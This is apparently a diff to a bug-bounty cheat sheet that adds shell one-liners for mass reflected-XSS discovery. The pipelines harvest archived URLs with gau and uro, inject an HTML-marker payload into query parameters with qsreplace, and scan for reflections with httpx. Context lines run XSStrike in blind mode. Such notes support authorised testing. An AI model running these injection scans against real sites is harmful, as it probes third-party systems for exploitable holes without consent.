@@ -9,9 +9,17 @@
 
     cat list.txt | httpx | xargs -I {} python xsstrike.py -u {} --level 3  --blind --file-log-level WARNING --log-file output.log
 
+## paramReflect
     cat urls.txt | go run ParamsReflect.go
     cat injected_urls.txt | sort -u | httpx -ms "<h1>akira</h1>" -fe "Location: .*<h1>akira</h1>.*" -t 200
 
+## gau+uro+httpx(My Xss)
+     cat domains.txt | gau --blacklist jpg,jpeg,png,gif,pdf,svg,json,yaml,rb,xml,css,js,webp,woff,woff2,eot,ttf,otf,mp4,mp3,txt --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp --o domain4xss.txt
+
+     uro < domains.txt | grep -E 'https?://[^?]+\?[a-zA-Z0-9_]+=[^&]+(&[a-zA-Z0-9_]+=[^&]+)*' | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E > domain4httpx.txt
+
+     cat domain4httpx.txt | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt
+   
    ### oneLine:
        cat Domains.txt | gau | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | uro | httpx -o domain4xss.txt
 
